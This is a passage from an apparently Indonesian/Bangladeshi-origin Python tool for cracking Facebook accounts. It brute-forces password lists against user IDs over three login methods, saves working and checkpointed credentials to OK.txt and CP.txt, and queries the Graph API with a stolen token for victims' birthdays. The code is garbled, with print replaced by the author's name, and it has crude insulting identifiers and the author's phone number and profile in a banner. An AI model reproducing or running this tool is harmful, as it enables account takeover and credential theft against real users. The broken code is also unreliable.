...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#Arafat-Mahin('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			Arafat-Mahin(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							Arafat-Mahin('[•] Result CP saved to CP.txt')
							Arafat-Mahin('\n\tCrack Processing...\n')
							Arafat-Mahin('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					Arafat-Mahin('\n01.) Metode b-api ')
					Arafat-Mahin('02.) Metode mbasic ')
					Arafat-Mahin('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			Arafat-Mahin('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			Arafat-Mahin(' [1] Arafat-Mahin Method 1 ')
			Arafat-Mahin(' [2] Arafat-Mahin Method 2  [ Pro ]')
			Arafat-Mahin(' [3] Arafat-Mahin Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [Arafat-Mahin] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if "access_token" in p:
				Arafat-Mahin('\r\033[1;92m[Successful-Arafat-Mahin] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					Arafat-Mahin('\r\033[1;91m[Checkpoint-Arafat-Mahin] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				Arafat-Mahin('\r\033[1;91m[Checkpoint-Arafat-Mahin] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				Arafat-Mahin('\r\033[1;32m[Successful-Arafat-Mahin] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].Arafat-Mahin('\r\033[1;91m[Checkpoint-Arafat-Mahin] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				Arafat-Mahin('\r\033[1;92m[Successful-Arafat-Mahin] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = IMTIAZ('token.txt').read()
					cp_ttl = Prof_Arafat-Mahin('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					Arafat-Mahin('\r\033[1;91m[Checkpoint-Arafat-Mahin] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
...
banner="""\033[1;37m
 ...
 [*]=============================================
    Author   : Arafat Mahin 
    Facebook : https://facebook.com/arafatmahin310
    Team     : V-ViruX 
    Connect  : 01925798757
 [*]=============================================
